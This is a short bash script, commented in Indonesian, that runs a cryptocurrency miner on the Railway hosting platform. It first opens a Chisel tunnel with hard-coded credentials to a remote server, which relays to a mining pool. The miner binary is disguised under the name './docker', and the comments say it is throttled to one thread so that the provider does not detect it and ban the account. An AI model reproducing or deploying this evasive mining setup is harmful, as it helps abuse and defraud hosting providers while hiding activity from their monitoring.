#!/bin/bash

# --- KONFIGURASI ---
IP_UBUNTU="45.115.224.184"

echo "Membuka The Ghost Tunnel (Chisel)..."
# Membuat terowongan dari Railway port 4629 ke pool via Ubuntu
# Railway hanya akan melihat koneksi HTTPS ke IP Ubuntu kamu
/usr/local/bin/chisel client --auth "mineruser:minerpass123" https://$IP_UBUNTU:443 4629:dagnam.xyz:4629 &

sleep 10

echo "Menjalankan Miner via Ghost Tunnel..."
# Miner sekarang menyambung ke localhost:4629
# PENTING: Gunakan -t 1 agar CPU tidak 100% dan memicu Ban
./docker -a yespower -o stratum+tcp://127.0.0.1:4629 -u WXDNsKHm8X4RQm9tMpXaLMmxb8Mp1Vxvh6.1 -p c=SWAMP -t 1
